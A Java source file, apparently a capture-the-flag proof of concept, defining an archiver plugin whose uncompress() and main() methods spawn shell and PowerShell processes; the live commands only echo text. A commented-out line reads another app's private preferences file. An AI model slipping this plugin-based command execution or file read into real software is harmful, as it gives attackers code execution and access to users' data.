package net.axolotl.zippier;

import java.io.File;
import java.io.IOException;

@SuppressWarnings("deprecation")
public class ZipFormat_7z implements ZipFormat {
// public class ZipFormat_7z {
    public static void main(String[] args) {
        // Runs immediately when class loads!
        // Runtime.getRuntime().exec("sh -c 'cat /data/data/com.badguy.mmarchiver/files/datastore/mm_archiver.preferences_pb'");

        try {
            ProcessBuilder pb = new ProcessBuilder("powershell", "echo", "HelloTask7!");
            // Redirect standard output and standard error to the console
            pb.inheritIO();
            Process process = pb.start();
            // Wait for the process to complete
            int exitCode = process.waitFor();
            System.out.println("Process exited with code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override // net.axolotl.zippier.ZipFormat
    public final String getExtension() {
        return "task7";
    }

    @Override
    public void uncompress(File sourceArchive, File destinationDir, ZipFile zipFile) {
        try {
            Process process = Runtime.getRuntime().exec("sh -c 'echo \"Hello task7!\"'");
            int exitCode = process.waitFor();
            System.out.println("Process exited with code: " + exitCode);

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}

